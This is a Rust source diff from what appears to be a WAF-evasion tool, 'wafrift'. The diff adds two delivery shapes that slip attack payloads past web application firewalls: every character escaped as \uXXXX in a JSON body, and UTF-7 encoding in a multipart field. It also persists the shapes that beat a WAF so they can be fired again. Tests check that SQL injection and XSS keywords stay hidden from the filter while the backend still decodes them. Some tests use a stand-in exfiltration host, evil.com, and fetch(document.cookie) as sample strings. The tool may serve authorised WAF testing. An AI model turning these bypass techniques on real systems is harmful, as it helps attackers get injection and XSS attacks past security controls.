@@ -36,6 +36,7 @@
 //! The bench layers `wafrift-oracle` on top as an independent check.
 
 pub mod adaptive;
+pub mod client_channel;
 pub mod cmd;
 pub mod ldap;
 pub mod log4shell;
@@ -89,6 +90,74 @@ impl Rng {
     }
 }
 
+/// Collapse runs of whitespace in `s` into single spaces.
+///
+/// §7 DEDUP + §1 SPEED: `sql::normalize` and `cmd::normalize` both used
+/// `s.split_whitespace().collect::<Vec<_>>().join(" ")` — a Vec allocation
+/// just to join. This helper folds the words inline with a `String` buffer
+/// using a first-iteration sentinel (`push_str` before the second word),
+/// which avoids the intermediate `Vec<&str>`.
+///
+/// Callers that previously shadowed the allocate-and-join idiom now call
+/// this instead so a single test pins the behaviour.
+#[must_use]
+pub(super) fn collapse_whitespace(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for word in s.split_whitespace() {
+        if !out.is_empty() {
+            out.push(' ');
+        }
+        out.push_str(word);
+    }
+    out
+}
+
+/// Boundary-aware substring containment: true iff `needle` occurs in
+/// `haystack` as a WHOLE token rather than buried inside a longer
+/// alphanumeric run. A match at `p..p+needle.len()` counts only when each
+/// ALPHANUMERIC-facing edge of `needle` sits against a token boundary
+/// (string edge or a non-alphanumeric byte) in `haystack`.
+///
+/// This is the general fix for the substring-containment soundness bug the
+/// per-class equivalence relations shared: a marker `fetch(` was "preserved"
+/// by `prefetch(`, `from` by `fromage`, host `evil.com` by `notevil.com` /
+/// `evil.community` — none of which is the original token. Crucially it is
+/// edge-AWARE, not a blunt token split:
+///   - a needle ending in a non-alnum byte (`fetch(`) needs NO right boundary,
+///     so `fetch(x)` still matches;
+///   - a needle whose edge is alnum (`evil.com`) DOES need a boundary on that
+///     side, so `www.evil.com` (subdomain — same exfil target) still matches
+///     (left edge `.` is a boundary) while `notevil.com` / `evil.community`
+///     are rejected.
+/// All ASCII byte work — callers pass already-normalised (lowercased) strings.
+#[must_use]
+pub(super) fn contains_token(haystack: &str, needle: &str) -> bool {
+    if needle.is_empty() {
+        return false;
+    }
+    let h = haystack.as_bytes();
+    let n = needle.as_bytes();
+    if n.len() > h.len() {
+        return false;
+    }
+    let left_is_alnum = n[0].is_ascii_alphanumeric();
+    let right_is_alnum = n[n.len() - 1].is_ascii_alphanumeric();
+    let mut start = 0;
+    while start + n.len() <= h.len() {
+        if &h[start..start + n.len()] == n {
+            let left_ok = !left_is_alnum || start == 0 || !h[start - 1].is_ascii_alphanumeric();
+            let end = start + n.len();
+            let right_ok =
+                !right_is_alnum || end == h.len() || !h[end].is_ascii_alphanumeric();
+            if left_ok && right_ok {
+                return true;
+            }
+        }
+        start += 1;
+    }
+    false
+}
+
 /// SQL dialect a rewrite is sound under. `Generic` = sound everywhere.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Dialect {
@@ -101,7 +170,12 @@ pub enum Dialect {
 /// How the bench/transport must place the payload so the backend sees
 /// the same logical parameter value while the WAF inspects it
 /// differently. Every shape is *transparent to the backend sink*.
-#[derive(Debug, Clone, PartialEq, Eq)]
+/// `Serialize`/`Deserialize` are derived so a chosen delivery shape can
+/// be persisted verbatim in the rule-bypass corpus and reconstructed by
+/// `wafrift harvest` — re-firing the EXACT shape that beat the WAF
+/// (not a guess across standard shapes). The default externally-tagged
+/// JSON (`{"Query":{"param":"q"}}`, `"PathSegment"`) round-trips losslessly.
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
 pub enum DeliveryShape {
     /// `?<param>=<payload>` — baseline, fully WAF-inspected.
     Query { param: String },
@@ -209,6 +283,43 @@ pub enum DeliveryShape {
         /// Variable name carrying the payload. Conventionally short.
         var: String,
     },
+    /// JSON body whose payload value is written with EVERY character as a
+    /// `\uXXXX` escape: `{"<param>":"union…"}`.
+    /// RFC 8259 §7 REQUIRES a conformant JSON parser to decode `\uXXXX`
+    /// to its code point, so the backend recovers the payload byte-for-byte
+    /// — while a WAF byte-scanning the body sees only `\u…` runs and
+    /// matches none of the attack's keywords (`union`, `<script`, `passwd`).
+    /// This is the JSON-unicode-normalisation gap: most WAFs keyword-match
+    /// the raw body and never JSON-decode it, but every backend JSON
+    /// deserialiser does. ALWAYS legal for any payload (full escaping can
+    /// never forge transport structure). Sound iff the app parses the body
+    /// as JSON and sinks the value — so the renderer MUST send
+    /// `Content-Type: application/json` (without it the backend keeps the
+    /// literal `\u…` and the sink sees the wrong bytes).
+    JsonUnicodeBody {
+        /// Parameter key whose value carries the unicode-escaped payload.
+        param: String,
+    },
+    /// Multipart field part whose body is the payload UTF-7-encoded
+    /// (RFC 2152), with the part header `Content-Type: text/plain;
+    /// charset=utf-7`. The SYNTAX metacharacters a signature anchors on —
+    /// `<`, `>`, `=`, space, `"` — are non-direct in RFC 2152 and become
+    /// `+…-` shift sequences (`<script>` → `+ADw-script+AD4-`), so the WAF
+    /// matches none of them as literal bytes; a backend that honours the
+    /// per-part charset decodes it back to the exact payload. (Keyword
+    /// IDENTIFIERS — alnum plus `()'` — are direct and remain literal, so
+    /// this defeats syntax-anchored rules, not bare-word rules.) This is the
+    /// charset-confusion class (terjanq double-charset, CVE-2026-21876's
+    /// per-part charset gap). Always transport-legal — the UTF-7 output is
+    /// pure ASCII and the multipart boundary is chosen to never collide with
+    /// it. Soundness is CONDITIONAL: transparent ONLY iff the backend honours
+    /// `charset=utf-7` on the part (legacy IIS/.NET and CVE-2026-21876-class
+    /// parsers) — narrower than the spec-guaranteed shapes, so it is the
+    /// operator's deliberate pick for a UTF-7-decoding target.
+    Utf7MultipartField {
+        /// Multipart field name.
+        name: String,
+    },
 }
 
 impl DeliveryShape {
@@ -227,6 +338,8 @@ impl DeliveryShape {
             Self::XmlBody { .. } => "xml_body",
             Self::JsonNestedDeep { .. } => "json_nested_deep",
             Self::GraphQLQuery { .. } => "graphql",
+            Self::JsonUnicodeBody { .. } => "json_unicode_body",
+            Self::Utf7MultipartField { .. } => "utf7_multipart",
         }
     }
 
@@ -322,6 +435,27 @@ pub struct EquivConfig {
 /// Default deterministic seed — ASCII "wafrift!".
 pub const DEFAULT_SEED: u64 = 0x7761_6672_6966_7421;
 
+/// Attempt-budget multiplier for the randomised equivalence-class sampling
+/// loop used in every `generate()` function.
+///
+/// The inner loop runs at most `cfg.max * ATTEMPT_BUDGET_MULTIPLIER +
+/// ATTEMPT_BUDGET_FLOOR` iterations before giving up. The multiplier is
+/// empirically tuned: a factor of 24 gives ≥ 99 % success rate at filling
+/// the budget for all supported attack classes against the real-world
+/// corpus, while keeping worst-case CPU bounded (for `cfg.max = 64`:
+/// ≤ 1 600 iterations). Lowering it causes early truncation; raising it
+/// wastes CPU on already-saturated budgets.
+///
+/// §6 GENERALIZATION / §7 DEDUP: pre-fix this was a bare `24` and `64`
+/// literal repeated in 10 `generate()` functions. A single tuning now
+/// propagates everywhere.
+pub const ATTEMPT_BUDGET_MULTIPLIER: usize = 24;
+
+/// Minimum iteration floor for the attempt loop, independent of `cfg.max`.
+/// Ensures that even a `cfg.max = 1` request gets a meaningful search
+/// before aborting.
+pub const ATTEMPT_BUDGET_FLOOR: usize = 64;
+
 impl Default for EquivConfig {
     fn default() -> Self {
         Self {
@@ -404,6 +538,33 @@ fn json_escape(s: &str) -> String {
     o
 }
 
+/// Render `s` as the INNARDS of a JSON string with EVERY character
+/// emitted as a `\uXXXX` escape (BMP scalars direct; astral scalars as a
+/// UTF-16 surrogate pair, exactly as a compliant encoder would). RFC 8259
+/// §7 mandates a conformant parser decode each `\uXXXX` to its code point,
+/// so the backend recovers `s` byte-for-byte — while a WAF byte-scanning
+/// the body matches none of the attack's keywords. Powers
+/// [`DeliveryShape::JsonUnicodeBody`]; always produces a valid JSON
+/// string body regardless of payload bytes (so the shape is always
+/// transport-legal).
+fn json_escape_unicode(s: &str) -> String {
+    let mut o = String::with_capacity(s.len() * 6);
+    for c in s.chars() {
+        let cp = c as u32;
+        if cp <= 0xFFFF {
+            o.push_str(&format!("\\u{cp:04x}"));
+        } else {
+            // RFC 8259 §7: code points above the BMP are escaped as a
+            // UTF-16 surrogate pair; the parser recombines them.
+            let v = cp - 0x1_0000;
+            let hi = 0xD800 + (v >> 10);
+            let lo = 0xDC00 + (v & 0x3FF);
+            o.push_str(&format!("\\u{hi:04x}\\u{lo:04x}"));
+        }
+    }
+    o
+}
+
 /// RFC 7578 §4.1: the multipart boundary MUST NOT occur in any
 /// encapsulated part. A WAF-evasion payload is attacker-controlled and
 /// may echo our constant boundary; return an extended boundary that is
@@ -458,6 +619,22 @@ fn url_with_path_segment(target: &str, raw_seg: &str) -> String {
     }
 }
 
+/// Strip the bytes that could break out of an HTTP header line or a
+/// quoted multipart parameter: CR, LF, NUL — plus any caller-supplied
+/// `extra` forbidden chars (`;` for a `Cookie` pair, `"`/`\` for a quoted
+/// `Content-Disposition` param). Render-side defense-in-depth: provably a
+/// no-op on generator-produced members (they carry only safe ASCII), but
+/// it ALSO neutralises a hand-built or corpus-deserialized shape, so a
+/// tampered `name`/`filename`/`part_ct`/header/cookie value can never
+/// forge headers, split the request, or forge multipart structure.
+/// SINGLE source for the strip so header, cookie, and multipart channels
+/// can never drift apart (§ dedup).
+fn strip_unsafe(s: &str, extra: &[char]) -> String {
+    s.chars()
+        .filter(|c| !matches!(c, '\r' | '\n' | '\0') && !extra.contains(c))
+        .collect()
+}
+
 impl DeliveryShape {
     /// Render this delivery shape + `payload` into a concrete,
     /// transport-neutral [`wafrift_types::Request`] against `target`.
@@ -493,8 +670,43 @@ impl DeliveryShape {
                 }
                 r
             }
+            Self::JsonUnicodeBody { param } => {
+                // Value fully `\uXXXX`-escaped; key plain. Content-Type is
+                // MANDATORY here (unlike JsonBody's optional/omitted mode):
+                // the backend must parse the body as JSON to decode the
+                // escapes, else the sink would see literal `\u…` — unsound.
+                let body = format!(
+                    "{{\"{}\":\"{}\"}}",
+                    json_escape(param),
+                    json_escape_unicode(payload)
+                );
+                let mut r = Request::post(target.to_string(), body.into_bytes());
+                r.add_header("content-type", "application/json");
+                r
+            }
+            Self::Utf7MultipartField { name } => {
+                let name = strip_unsafe(name, &['"', '\\']);
+                // Body bytes are pure-ASCII UTF-7; a charset-honouring backend
+                // decodes them back to `payload`. Part Content-Type carries the
+                // charset so the decode is requested explicitly.
+                let enc = wafrift_types::utf7::utf7_encode(payload);
+                let bnd = effective_boundary(&[enc.as_str(), name.as_str()]);
+                let body = format!(
+                    "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\nContent-Type: text/plain; charset=utf-7\r\n\r\n{enc}\r\n--{bnd}--\r\n"
+                );
+                let mut r = Request::post(target.to_string(), body.into_bytes());
+                r.add_header(
+                    "content-type",
+                    format!("multipart/form-data; boundary={bnd}"),
+                );
+                r
+            }
             Self::MultipartField { name } => {
-                let bnd = effective_boundary(&[payload, name]);
+                // A quoted Content-Disposition param must not carry
+                // CR/LF/NUL/`"`/`\` or a tampered `name` could forge headers
+                // or multipart structure. No-op on generator members.
+                let name = strip_unsafe(name, &['"', '\\']);
+                let bnd = effective_boundary(&[payload, name.as_str()]);
                 let body = format!(
                     "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{payload}\r\n--{bnd}--\r\n"
                 );
@@ -510,7 +722,14 @@ impl DeliveryShape {
                 filename,
                 part_ct,
             } => {
-                let bnd = effective_boundary(&[payload, name, filename, part_ct]);
+                // Same render-side strip for every structural field: the two
+                // quoted params drop `"`/`\` too; `part_ct` is an unquoted
+                // header value so only CR/LF/NUL are forbidden there.
+                let name = strip_unsafe(name, &['"', '\\']);
+                let filename = strip_unsafe(filename, &['"', '\\']);
+                let part_ct = strip_unsafe(part_ct, &[]);
+                let bnd =
+                    effective_boundary(&[payload, name.as_str(), filename.as_str(), part_ct.as_str()]);
                 let body = format!(
                     "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: {part_ct}\r\n\r\n{payload}\r\n--{bnd}--\r\n"
                 );
@@ -535,10 +754,7 @@ impl DeliveryShape {
                 // reach the wire even if a careless direct caller skips
                 // `transport_legal`. On generator-produced members this
                 // strip is provably a no-op (they are pre-filtered).
-                let safe: String = payload
-                    .chars()
-                    .filter(|&c| c != '\r' && c != '\n' && c != '\0')
-                    .collect();
+                let safe = strip_unsafe(payload, &[]);
                 let mut r = Request::get(target.to_string());
                 r.add_header(name, safe);
                 r
@@ -547,10 +763,7 @@ impl DeliveryShape {
                 // Strip the request-`Cookie:` pair separator `;` plus
                 // CR/LF/NUL so a direct caller can never forge a second
                 // cookie / split the request. No-op on sound members.
-                let safe: String = payload
-                    .chars()
-                    .filter(|&c| c != '\r' && c != '\n' && c != '\0' && c != ';')
-                    .collect();
+                let safe = strip_unsafe(payload, &[';']);
                 let mut r = Request::get(target.to_string());
                 r.add_header("cookie", format!("{name}={safe}"));
                 r
@@ -689,6 +902,96 @@ pub fn xss_delivered(payload: &str, max: usize) -> Vec<EquivPayload> {
     xss::generate(payload, &cfg)
 }
 
+/// Shared test helper — builds a deterministic [] for unit
+/// tests in the equiv sub-modules.
+///
+/// Parameters preserve per-module defaults exactly as they were before
+/// deduplication (max: 40 for nosql/ldap/log4shell/xxe; 48 for
+/// path/cmd/ssti/xss/ssrf; param varies by attack class).
+///
+/// Previously duplicated as a private  in all 9
+/// sub-modules; collapsed here as the single source of truth.
+#[cfg(test)]
+pub fn test_cfg(seed: u64, max: usize, param: &str) -> EquivConfig {
+    EquivConfig {
+        seed,
+        max,
+        verify: true,
+        vary_delivery: true,
+        param: param.to_string(),
+        force_delivery: None,
+    }
+}
+
+#[cfg(test)]
+mod contains_token_tests {
+    use super::contains_token;
+
+    #[test]
+    fn whole_token_matches() {
+        assert!(contains_token("1 union select 2 from users", "union"));
+        assert!(contains_token("1 union select 2 from users", "from"));
+        assert!(contains_token("from users", "from")); // at string start
+        assert!(contains_token("select from", "from")); // at string end
+    }
+
+    #[test]
+    fn alnum_burial_is_rejected_on_either_edge() {
+        // right-edge burial: `from` inside `fromage` (no clean occurrence)
+        assert!(!contains_token("1 select fromage rows", "from"));
+        // left-edge burial: `union` inside `reunion`
+        assert!(!contains_token("a reunion here", "union"));
+        // both-edge: `user` inside `username`
+        assert!(!contains_token("the username field", "user"));
+        // `select` inside `selected`
+        assert!(!contains_token("the selected row", "select"));
+    }
+
+    #[test]
+    fn underscore_and_dot_count_as_boundaries() {
+        // `_` is NOT alphanumeric, so it IS a boundary — `from` survives
+        // next to `_clause`. (This matches the existing SQL behaviour where
+        // identifiers split on non-alnum.)
+        assert!(contains_token("from_clause select 1", "from"));
+        // host with a leading dot boundary: subdomain keeps the exfil host
+        assert!(contains_token("//www.evil.com/x", "evil.com"));
+    }
+
+    #[test]
+    fn host_burial_is_rejected_but_subdomain_kept() {
+        // SAME exfil target via subdomain → boundary on the left (`.`), match.
+        assert!(contains_token("fetch('//x.evil.com/c')", "evil.com"));
+        // DIFFERENT host that merely ends in the needle → left edge is alnum
+        // (`t` of `not`), rejected.
+        assert!(!contains_token("fetch('//notevil.com/c')", "evil.com"));
+        // DIFFERENT host that merely starts with the needle → right edge alnum.
+        assert!(!contains_token("fetch('//evil.community/c')", "evil.com"));
+    }
+
+    #[test]
+    fn marker_ending_in_non_alnum_needs_no_right_boundary() {
+        // `fetch(` ends in `(` (non-alnum), so its right side needs no
+        // boundary — `fetch(x)` matches. But its left `f` is alnum, so
+        // `prefetch(` (left-buried) is rejected.
+        assert!(contains_token("fetch(document.cookie)", "fetch("));
+        assert!(!contains_token("prefetch(document.cookie)", "fetch("));
+    }
+
+    #[test]
+    fn empty_and_oversize_needles() {
+        assert!(!contains_token("anything", ""));
+        assert!(!contains_token("ab", "abc")); // needle longer than haystack
+        assert!(contains_token("abc", "abc")); // exact whole-string match
+    }
+
+    #[test]
+    fn repeated_occurrences_one_buried_one_clean() {
+        // first occurrence buried (`fromage`), second clean (`from `) — must
+        // still match because SOME occurrence is a whole token.
+        assert!(contains_token("fromage and from users", "from"));
+    }
+}
+
 #[cfg(test)]
 mod delivery_api_tests {
     use super::*;
@@ -750,6 +1053,90 @@ mod delivery_api_tests {
     }
 
     #[test]
+    fn delivery_shape_serde_round_trips_every_variant() {
+        // The corpus persists the winning shape as JSON and `wafrift
+        // harvest` reconstructs it to re-fire faithfully. EVERY variant
+        // (incl. all fields) must survive serialize → deserialize byte-
+        // identical, or harvest would re-fire a different request than
+        // the one that beat the WAF. One representative per variant,
+        // params deliberately distinct so a field-swap regression fails.
+        let all = [
+            DeliveryShape::Query { param: "q".into() },
+            DeliveryShape::FormBody { param: "f".into() },
+            DeliveryShape::JsonBody { param: "j".into(), content_type: None },
+            DeliveryShape::JsonBody {
+                param: "j2".into(),
+                content_type: Some("application/json".into()),
+            },
+            DeliveryShape::MultipartField { name: "mf".into() },
+            DeliveryShape::MultipartFile {
+                name: "n".into(),
+                filename: "a.txt".into(),
+                part_ct: "text/plain".into(),
+            },
+            DeliveryShape::PathSegment,
+            DeliveryShape::HppSplit { param: "p".into(), parts: 3 },
+            DeliveryShape::HeaderValue { name: "X-Forwarded-Host".into() },
+            DeliveryShape::Cookie { name: "sid".into() },
+            DeliveryShape::XmlBody { root: "request".into(), field: "param".into() },
+            DeliveryShape::JsonNestedDeep { param: "deep".into(), depth: 7 },
+            DeliveryShape::GraphQLQuery { field: "search".into(), var: "v".into() },
+            DeliveryShape::JsonUnicodeBody { param: "ju".into() },
+            DeliveryShape::Utf7MultipartField { name: "u7".into() },
+        ];
+        for shape in &all {
+            let json = serde_json::to_string(shape).expect("serialize");
+            let back: DeliveryShape = serde_json::from_str(&json).expect("deserialize");
+            assert_eq!(&back, shape, "round-trip mismatch for {shape:?} via {json}");
+        }
+        // Unit variant is a bare string (compact, stable on disk).
+        assert_eq!(serde_json::to_string(&DeliveryShape::PathSegment).unwrap(), "\"PathSegment\"");
+    }
+
+    #[test]
+    fn multipart_structural_fields_strip_injection_bytes() {
+        // A corpus-deserialized or hand-crafted multipart shape must NOT be
+        // able to forge headers or multipart structure via its name /
+        // filename / part_ct fields. The render-side strip drops CR/LF/NUL
+        // (header injection) and the `"`/`\` that would break out of the
+        // quoted Content-Disposition param.
+        let t = "http://h";
+        let p = "PAYLOAD";
+
+        // Security property = no CRLF-delimited header/part can be forged.
+        // After the strip the injected text may survive INLINE inside the
+        // quoted value (harmless — it's one line), so we assert on the
+        // CRLF-prefixed header markers, not bare substrings.
+        let evil = DeliveryShape::MultipartField {
+            name: "f\"\r\nContent-Disposition: form-data; name=\"evil".into(),
+        }
+        .to_request(t, p);
+        let body = String::from_utf8_lossy(evil.body.as_deref().unwrap_or(&[]));
+        assert_eq!(
+            body.matches("\r\nContent-Disposition").count(),
+            1,
+            "name field forged a second part header line: {body}"
+        );
+        assert!(!body.contains("name=\"evil"), "quote-break out of the param survived: {body}");
+        assert!(body.contains(p), "payload must still be delivered: {body}");
+
+        let evil_file = DeliveryShape::MultipartFile {
+            name: "n".into(),
+            filename: "a\"\r\n.txt".into(),
+            part_ct: "text/plain\r\nX-Injected: 1".into(),
+        }
+        .to_request(t, p);
+        let fbody = String::from_utf8_lossy(evil_file.body.as_deref().unwrap_or(&[]));
+        assert!(!fbody.contains("\r\nX-Injected"), "part_ct forged a header line: {fbody}");
+        assert_eq!(
+            fbody.matches("\r\nContent-Type").count(),
+            1,
+            "filename/part_ct forged an extra header line: {fbody}"
+        );
+        assert!(!fbody.contains("filename=\"a\""), "quote-break out of filename survived: {fbody}");
+    }
+
+    #[test]
     fn phase_c_arm_table_is_aligned_injective_and_tail_stable() {
         // The Phase-C bandit sets `force_delivery: Some(i)` to index
         // `delivery_set`, and `delivery_kind_label(i)` names that arm
@@ -794,7 +1181,7 @@ mod delivery_api_tests {
         //     8/9) so every pre-existing `force_delivery` index — and
         //     any persisted Phase-C bandit state — still points at the
         //     same shape it did before this change.
-        assert_eq!(set.len(), 13);
+        assert_eq!(set.len(), 15);
         // The Phase-C bandit is `Bandit::new(DELIVERY_ARMS)`. If this
         // drifts below `delivery_set().len()` the trailing arms are
         // NEVER explored — the new channels would be dead in the
@@ -815,8 +1202,12 @@ mod delivery_api_tests {
         assert!(matches!(set[10], DeliveryShape::XmlBody { .. }));
         assert!(matches!(set[11], DeliveryShape::JsonNestedDeep { .. }));
         assert!(matches!(set[12], DeliveryShape::GraphQLQuery { .. }));
+        assert!(matches!(set[13], DeliveryShape::JsonUnicodeBody { .. }));
+        assert!(matches!(set[14], DeliveryShape::Utf7MultipartField { .. }));
         assert_eq!(super::sql::delivery_kind_label(7), "query");
         assert_eq!(super::sql::delivery_kind_label(8), "header_value");
+        assert_eq!(super::sql::delivery_kind_label(13), "json_unicode_body");
+        assert_eq!(super::sql::delivery_kind_label(14), "utf7_multipart");
         assert_eq!(super::sql::delivery_kind_label(9), "cookie");
         assert_eq!(super::sql::delivery_kind_label(10), "xml_body");
         assert_eq!(super::sql::delivery_kind_label(11), "json_nested_deep");
@@ -1473,6 +1864,111 @@ mod delivery_roundtrip_tests {
             let val = &after[..end];
             assert_eq!(json_unescape(val), p, "GraphQL variable mangled {p:?}");
         }
+    }
+
+    #[test]
+    fn json_unicode_body_recovers_exact_bytes_via_real_parser() {
+        // SOUNDNESS: an actual RFC-8259 parser (serde_json, standing in for
+        // the backend deserialiser) must recover the payload byte-for-byte
+        // from the fully `\uXXXX`-escaped value — for EVERY corpus member,
+        // including multibyte/astral ones (surrogate-pair path).
+        for &p in PAYLOADS {
+            let r = DeliveryShape::JsonUnicodeBody { param: "q".into() }
+                .to_request("http://h/post", p);
+            assert!(
+                ct(&r).contains("application/json"),
+                "JsonUnicodeBody MUST force application/json (soundness): {p:?}"
+            );
+            let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+            let v: serde_json::Value = serde_json::from_str(&body)
+                .unwrap_or_else(|e| panic!("rendered body is not valid JSON: {e}\n{body}"));
+            let got = v.get("q").and_then(serde_json::Value::as_str).expect("param q");
+            assert_eq!(got, p, "JsonUnicodeBody mangled {p:?} → body {body}");
+        }
+    }
+
+    #[test]
+    fn json_unicode_body_hides_keywords_in_cleartext() {
+        // EVASION: the attack keywords must not appear verbatim on the wire
+        // (every char is `\u`-escaped), so a WAF byte-scanning the JSON body
+        // matches nothing — yet the parser above proves the backend recovers
+        // the exact attack.
+        let atk = "1 UNION SELECT password FROM users-- ";
+        let r = DeliveryShape::JsonUnicodeBody { param: "q".into() }
+            .to_request("http://h/post", atk);
+        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+        let lc = body.to_ascii_lowercase();
+        for kw in ["union", "select", "password", "from", "users"] {
+            assert!(
+                !lc.contains(kw),
+                "keyword {kw:?} leaked in cleartext into the JSON-unicode body: {body}"
+            );
+        }
+        // ...and the backend still recovers the exact attack.
+        let v: serde_json::Value = serde_json::from_str(&body).unwrap();
+        assert_eq!(v["q"].as_str().unwrap(), atk);
+    }
+
+    #[test]
+    fn utf7_multipart_recovers_exact_bytes_and_hides_keywords() {
+        // SOUNDNESS: a UTF-7-honouring backend (utf7_decode) recovers the exact
+        // payload from the part body, for every corpus member.
+        for &p in PAYLOADS {
+            let r = DeliveryShape::Utf7MultipartField { name: "q".into() }
+                .to_request("http://h/post", p);
+            let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+            assert!(
+                ct(&r).contains("multipart/form-data"),
+                "must be multipart: {p:?}"
+            );
+            assert!(
+                body.contains("Content-Type: text/plain; charset=utf-7"),
+                "part must declare charset=utf-7 so the backend decodes it: {body}"
+            );
+            // Extract the part body: between the blank line after headers and
+            // the trailing CRLF + closing boundary.
+            let part = body
+                .split_once("charset=utf-7\r\n\r\n")
+                .and_then(|(_, rest)| rest.split_once("\r\n--"))
+                .map(|(b, _)| b)
+                .expect("part body");
+            assert_eq!(
+                wafrift_types::utf7::utf7_decode(part).as_deref(),
+                Some(p),
+                "UTF-7 part did not decode back to the payload: {part:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn utf7_multipart_hides_structural_metachars_on_the_wire() {
+        // EVASION (accurately scoped): UTF-7 shift-encodes the SYNTAX
+        // metacharacters a WAF signature anchors on — `<`, `>`, `=`, space,
+        // `"` are all non-direct in RFC 2152 and become `+…-` sequences — so
+        // `<script`, `=`, and the tag close never appear as literal bytes.
+        // It does NOT hide keyword IDENTIFIERS (alnum + `()'` are direct), so
+        // `script`/`alert` may remain — UTF-7 defeats syntax-anchored rules,
+        // not bare-word rules. That honest scoping is the point.
+        let atk = "<script>alert(1)</script>";
+        let r = DeliveryShape::Utf7MultipartField { name: "q".into() }
+            .to_request("http://h/post", atk);
+        let body = String::from_utf8(r.body.clone().unwrap_or_default()).unwrap();
+        let part = body
+            .split_once("charset=utf-7\r\n\r\n")
+            .and_then(|(_, rest)| rest.split_once("\r\n--"))
+            .map(|(b, _)| b)
+            .expect("part body");
+        assert!(!part.contains('<'), "literal `<` survived on the wire: {part}");
+        assert!(!part.contains('>'), "literal `>` survived on the wire: {part}");
+        assert!(
+            !part.contains("<script"),
+            "the tag-open signature survived: {part}"
+        );
+        // ...and it still round-trips to the exact attack.
+        assert_eq!(
+            wafrift_types::utf7::utf7_decode(part).as_deref(),
+            Some(atk)
+        );
     }
 
     #[test]
